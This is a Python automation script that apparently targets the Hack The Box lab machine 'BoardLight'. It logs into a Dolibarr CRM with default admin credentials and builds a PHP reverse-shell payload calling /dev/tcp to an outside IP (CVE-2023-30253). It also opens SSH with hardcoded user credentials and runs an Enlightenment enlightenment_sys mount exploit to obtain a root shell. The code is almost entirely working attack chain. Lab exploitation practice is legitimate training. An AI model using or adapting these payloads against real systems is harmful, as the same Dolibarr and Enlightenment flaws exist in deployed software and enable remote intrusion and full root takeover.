import sys, os
import time as cm
import requests
import re
import subprocess
import paramiko
from threading import Thread
import time as cm
from colorama import Fore, init
from consolemenu import SelectionMenu

init(autoreset=True)

def banner():
    os.system("clear")
    bnn = """
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢿⣧⠀⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣶⡀⠀⠀⢀⡴⠛⠁⠀⠘⣿⡄⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣷⣤⡴⠋⠀⠀⠀⠀⠀⢿⣇⠀         ▓█████ ▄████▄   ██░ ██  ██ ▄█▀                       █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠺⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢸⣿⠀         ▓█   ▀▒██▀ ▀█  ▓██░ ██▒ ██▄█▒                        █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠈⣿⡀         ▒███  ▒▓█    ▄ ▒██▀▀██░▓███▄░                        █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢏⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣿⡇         ▒▓█  ▄▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄                        █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣷⣾⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢿⡇         ░▒████▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄                       █
                  ⠀⠀⠀⠀⠀⠀⠀⢀⡾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⢸⡇         ░░ ▒░ ░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒                       █
                  ⠀⠀⠀⠀⠀⠀⢠⡞⠁⢹⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢸⠀          ░ ░  ░ ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░                       █
                  ⠀⠀⠀⠀⠀⣠⠟⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⢸⠀          ░  ░         ░  ░░ ░░ ░░ ░                          █
                  ⠀⠀⠀⠀⣰⠏⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀                                                              █
                  ⠀⠀⠀⣴⠋⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀                                                              █
                  ⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀          ___ ___ ___ ___                                     █
                  ⢀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀         (___|___|___|___)                                    █
                  ⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀         G1thub: https://github.com/l44x                      █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀         T4skT00l: Pw3ned-R00t [ BoardLight ]                 █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀    ___ ___ ___ ___                                           █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀   (___|___|___|___)                                          █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠃                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                              █
                  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    """
    print(Fore.GREEN + f"{bnn}")
    
global machine_ip
global target_machine

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.11.11"

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(Fore.RED + f"\n\t\t~ [HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
            print(Fore.LIGHTWHITE_EX + f"\t\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n")
        else:
            print(Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [Vpn-Status] {e}")

def user_default_hackthebox():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ') # if hackthebox change ip, change this parameter.
        #machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
        print("----------------------------------------------------")
        print(Fore.CYAN + f"\t\t ~ [Default User Connection]")
        print(Fore.RED + f"\n\t\t\t\t\t[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(Fore.RED + f"\t\t\t\t\t[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(Fore.RED + f"\t\t\t\t\t[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(Fore.RED + f"\t\t\t\t\t[Target Path Exploit] > " + Fore.YELLOW + f"http://crm.board.htb/")
        else:
            print(Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked BoardLight Network")
        print("----------------------------------------------------\n")
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")


def enter_dashboard_and_send_shell():
    
    login_url="http://crm.board.htb/"
    website_url="http://crm.board.htb/website/index.php?action=createsite"
    page_url_shell="http://crm.board.htb/public/website/index.php?website=test&pageref=test"
    meta="http://crm.board.htb/public/website/index.php"

    
    s = requests.Session()
    
    r1 = s.get(login_url)
    
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    
    header2 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Referer': 'http://crm.board.htb/website/index.php?action=createsite',
        'Content-Type': 'multipart/form-data; boundary=---------------------------137469197942783080401992022325',
    }
    
    cokkie = r1.headers.get('Set-Cookie').replace("_",";").replace("=",";").split(";")[1].strip() #Cokkie
    #print(r1.content)
    token = re.findall(r'<meta name="anti-csrf-newtoken" content="([A-Za-z0-9+/=]+)', r1.content.decode('utf-8'))
    print(token[0])
    
    data=f"token={token[0]}&actionlogin=login&loginfunction=loginfunction&backtopage=&tz=0&tz_string=Atlantic%2FReykjavik&dst_observed=0&dst_first=&dst_second=&screenwidth=1892&screenheight=938&dol_hide_topmenu=&dol_hide_leftmenu=&dol_optimize_smallscreen=&dol_no_mouse_hover=&dol_use_jmobile=&username=admin&password=admin"
    r2 = s.post(login_url, data=data, headers=header2)
    print(r2.content)
    print(r2.headers)
    # asd1 = s.get(meta, headers=header)
    # print(asd1.content)
    
    # print(r2.headers.get('Content-Type'))
    
    #print(r2.content)
    print(token[0].strip())
    # Enviar la solicitud para crear el sitio
    data2 = {
        "token": f"{token[0]}",
        "backtopage": "",
        "dol_openinpopup": "",
        "action": "addsite",
        "website": "-1",
        "WEBSITE_REF": "test",
        "WEBSITE_LANG": "en",
        "WEBSITE_OTHERLANG": "",
        "WEBSITE_DESCRIPTION": "",
        "virtualhost": ""
    }
    
    #r3 = s.post(website_url, data=data2, headers=header)
    boundary= s.post(website_url, data=data2)
    print(boundary.headers)
    # print("Respuesta de creación de sitio:", r3.content)
    
    data3 = {
    #"token": f"{token[0].strip()}",
    "backtopage": "",
    "dol_openinpopup": "",
    "action": "addcontainer",
    "website": "test",
    "pageidbis": "-1",
    #"pageid": "",
    "radiocreatefrom": "checkboxcreatemanually",
    "WEBSITE_TYPE_CONTAINER": "page",
    "sample": "empty",
    "WEBSITE_TITLE": "testpage",
    "WEBSITE_PAGENAME":"test",
    #"WEBSITE_ALIASALT":"",
    #"WEBSITE_DESCRIPTION":"",
    #"WEBSITE_IMAGE":"",
    #"WEBSITE_KEYWORDS":"",
    #"WEBSITE_LANG":"0",
    #"WEBSITE_AUTHORALIAS":"",
    #"datecreation":"",
    "addcontainer":"Create",
    "grabimages":"1",
    "grabimagesinto":"root",
    "":""
    }
    
    # sub_page_url=f"http://crm.board.htb/website/index.php?action=createcontainer&token={token}&website=test"
    # r4 = s.post(sub_page_url,data=data3, headers=header)
    # print(r4.content)
    
    page_url_edit=f"http://crm.board.htb/website/index.php?website=test&pageid=6&action=editsource&token={token}"

    data4={
        #"token": f"{token}",
        "action": "updatesource",
        "website":"test",
        "pageid":"6",
        "update":"Save",
        "PAGE_CONTENT_x":"0",
        "PAGE_CONTENT_y":"4",
        "PAGE_CONTENT":"""<section id="mysection1" contenteditable="true">
    <?pHp exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.16.5/1010 0>&1'"); ?>
</section>"""
    }
    
    # r5 = s.post(page_url_edit, headers=header, data=data4)
    # print(r5.content)
    
    # s.get(page_url_shell)

def unlocked():
    try:
        checker_status()
        user_default_hackthebox()
        
        # Menu seleccionar usuario a conectarse.
        while True:
            users=["www-data", "larissa", "root", "exit"]
            client = paramiko.SSHClient()
            host = target_machine
            username = "larissa"
            password = "serverfun2$2023!!"
            print("----------------------------------------------------")
            print(Fore.MAGENTA + f"\t\t ~ [M3NU 0PT1ONS S3L3CT10N]\n")
            for index,user in enumerate(users):
                print(Fore.RED + f"\t\t\t\t\t[Exploit - Menu Options] > " + Fore.GREEN + f"{index+1} > {user}")
            
            print(Fore.LIGHTYELLOW_EX+f"\t\t\t\t\t/----------------------------/")
            user_call= int(input(f"\t\t\t\t\t ~ What ur user select? > "))
            print("----------------------------------------------------\n")

            if user_call == 1:
                try:
                    print("----------------------------------------------------")
                    print(Fore.CYAN + f"\t\t ~ [Connection to www-data :)]\n")
                    cm.sleep(.5)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Path] > " + Fore.GREEN + f"http://crm.board.htb/")
                    print(Fore.RED + f"\t\t\t\t\t[Exploit Message] > " + Fore.YELLOW + f"I have error for Auto Revershell, Sorry :/")
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Credentials] > " + Fore.LIGHTWHITE_EX + f"User: admin | Pass: admin")
                    print(Fore.GREEN + f"\t\t\t\t\t[Exploit - Message] > " + Fore.LIGHTCYAN_EX + f"Use CVE-2023-30253 for exploit.")
                    cm.sleep(.5)
                    #enter_dashboard_and_send_shell()
                    print("----------------------------------------------------\n")
                except paramiko.ssh_exception.NoValidConnectionsError:
                    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")
                    break
                    

            if user_call == 2:
                try:
                    print("----------------------------------------------------")
                    print(Fore.CYAN + f"\t\t ~ [Connection to larissa :)]\n")
                    cm.sleep(.5)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Path Credentials] > " + Fore.GREEN + f"/var/www/html/crm.board.htb/htdocs/conf")
                    cm.sleep(.5)
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(host, username=username, password=password)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.GREEN + f"Succeslly")
                    #init shell
                    shell = client.invoke_shell()
                    while True:
                        if shell.recv_ready():
                            output = shell.recv(1024).decode('utf-8')
                            print(output, end="")
                            
                        command = input("$ ")
                        if command.lower() in ["exit", "quit"]:
                            print("\n[!] Closing connection...")
                            break
                        
                        shell.send(command + "\n")
                        cm.sleep(0.5)

                        while shell.recv_ready():
                            output = shell.recv(1024).decode('utf-8')
                            print(output, end="")

                    shell.close()
                    client.close()
                    print("----------------------------------------------------\n")
                    break
                except paramiko.ssh_exception.NoValidConnectionsError:
                    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")
                    break

            elif user_call == 3:
                try:
                    print("----------------------------------------------------")
                    print(Fore.CYAN + f"\t\t ~ [Connection to root :)]\n")
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(host, username=username, password=password)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.GREEN + f"Succeslly")
                    #init shell
                    shell = client.invoke_shell()
                    shell.send("mkdir -p /tmp/net" + "\n"); cm.sleep(0.8)
                    shell.send('mkdir -p "/dev/../tmp/;/tmp/exploit"' + "\n"); cm.sleep(0.8)
                    shell.send('echo "/bin/sh" > /tmp/exploit' + "\n"); cm.sleep(0.8)
                    shell.send('chmod a+x /tmp/exploit' + "\n"); cm.sleep(0.8)
                    shell.send('/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net' + "\n"); cm.sleep(3)
                    #shell.send('cat /root/root.txt' + "\n\n")
                    while True:
                        if shell.recv_ready():
                            output = shell.recv(1024).decode('utf-8')
                            print(output, end="")
                            
                        command = input("$ ")
                        if command.lower() in ["exit", "quit"]:
                            print("\n[!] Closing connection...")
                            break
                        
                        shell.send(command + "\n")
                        cm.sleep(0.5)

                        while shell.recv_ready():
                            output = shell.recv(1024).decode('utf-8')
                            print(output, end="")

                    shell.close()
                    client.close()
                    print("----------------------------------------------------\n")
                    break
                except paramiko.ssh_exception.NoValidConnectionsError:
                    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")
                    break
            
            elif user_call == 4:
                    break
            else:
                break
            
            
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [root-user] {e}")

if __name__ == '__main__':
    banner()
    unlocked()
